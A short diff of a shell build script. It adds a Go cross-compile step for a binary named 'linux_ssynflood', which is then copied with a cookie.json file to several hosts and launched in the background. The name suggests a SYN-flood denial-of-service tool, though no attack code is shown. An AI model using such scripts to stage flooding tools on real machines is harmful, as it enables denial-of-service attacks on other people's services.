@@ -16,7 +16,7 @@ cd /root/build/ && nohup ./linux_ssynflood $start_bash >> result.log 2>&1 &
              " > build/$conf_host.sh
     done
 
-
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o linux_ssynflood   ./
 cp ${bash_path}/linux_ssynflood build/
 cp ${bash_path}/cookie.json build/
 chmod +x build/*.sh
